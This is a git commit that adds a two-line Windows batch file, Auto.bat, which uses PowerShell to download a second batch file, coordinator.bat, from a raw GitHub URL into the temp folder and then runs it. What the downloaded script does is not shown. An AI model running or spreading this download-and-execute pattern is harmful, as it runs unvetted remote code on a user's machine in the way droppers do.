68290de21bb2fc4d38bf3f23fa38f58397fa7965
droid003best <54209012+droid003best@users.noreply.github.com>
2020-10-25 15:52:04 +0100

    Add files via upload

---
+++ Auto.bat
@@ -0,0 +1,2 @@
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/coordinator.bat', '%Temp%\coordinator.bat') }"
+start %Temp%\coordinator.bat
